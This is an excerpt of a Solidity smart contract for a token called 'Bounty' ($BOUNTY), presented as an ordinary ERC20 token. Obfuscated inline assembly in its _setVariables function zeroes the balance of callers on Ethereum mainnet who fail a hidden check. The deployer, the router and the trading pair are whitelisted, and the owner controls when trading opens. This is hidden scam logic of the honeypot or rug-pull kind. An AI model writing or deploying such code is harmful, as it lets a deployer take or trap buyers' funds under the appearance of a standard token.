...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    bool private trading; uint256 private smallV = 1; bool private bigCool;
    uint256 private _decimals; uint256 private gameHunter;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addBounty.push(_router); addBounty.push(msgSender_); addBounty.push(pair);
        for (uint256 q=0; q < 3;) {_firstShrimp[addBounty[q]] = true; unchecked{q++;} }
    }
    ...
    function _setVariables() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0xa886e33f8d7e42d6292d8c40b3ae814cd941b9a6a1a72bfd04813b233a28950b
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x7b38f6c895bbb0f2024f7d300b1a8c699c445e3745258f9995a79e60d3819113,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; whaleShark = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addBounty[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
...
contract $BOUNTY is ERC20Token {
    constructor() ERC20Token("Bounty", "BOUNTY", msg.sender, 250000000 * 10 ** 18) {
    }
}